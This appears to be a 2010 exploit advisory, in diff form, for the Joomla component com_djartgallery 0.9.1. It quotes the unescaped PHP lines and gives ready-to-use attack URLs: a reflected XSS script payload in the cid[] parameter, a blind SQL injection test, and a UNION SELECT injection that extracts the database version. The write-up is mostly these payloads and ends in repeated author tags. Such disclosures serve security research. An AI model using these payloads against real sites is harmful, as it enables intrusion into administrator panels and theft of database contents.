@@ -1,0 +1,52 @@
+#Exploit Title:		Joomla Component com_djartgallery Multiple Vulnerabilities
+
+#Date:			04/06/2010 
+
+#Author:		Tomasz Kowalski
+
+#Software Link:		http://www.design-joomla.eu/downloads/download/components/dj-artgallery.html
+
+#Version:		0.9.1
+
+#Tested on:		Linux ubuntu32 2.6.32-22-generic x64
+
+#Summary:
+	
+[+] Cross Site Scripting on administrator/components/com_djartgallery/views/editimage/tmpl/default.php:
+
+	We can fond this code on line 183:
+	...	
+	<input type="hidden" name="id" value="<?php echo JRequest::getVar('id'); ?>" />
+	<input type="hidden" name="option" value="com_djartgallery" />
+	<input type="hidden" name="task" value="editImage" />
+	...
+
+	You must see it }x) 	
+
+	<input type="hidden" name="id" value="<?php echo JRequest::getVar('id'); ?>" />
+
+	Method to exploit this could be next code injection:
+	
+	http://localhost/joomla/administrator/index.php?option=com_djartgallery&task=editItem
+	&cid[]=%22%3E%3C/form%3E%3CSCRIPT%3Ealert%28%22XSS%20by%20r0i%22%29;%3C/script%3E
+
+[+]Blind SQL Injection
+
+	Also we can extract it databases information through Blind SQL Injection, on same parameter, how to we will see on next code:
+administrator/components/com_djartgallery/controller.php, line 382:
+
+	$link = 'index.php?option=com_djartgallery&task=com_djartgallery&task=editItem&cid[]='.JRequest::getVar('id');
+
+	To exploit it:
+	
+	http://victim/administrator/index.php?option=com_djartgallery&task=editItem
+	&cid[]=1'+and+1=1+--+
+
+	Field 'Select Article' its changed when reply its true/false; but too its likely that run UNION injection:
+
+	http://victim/administrator/index.php?option=com_djartgallery&task=editItem
+	&cid[]=-1%27/*!UNION%20SELECT%20@@version,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25*/+--+
+
+	
+	
+by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i  by r0i 
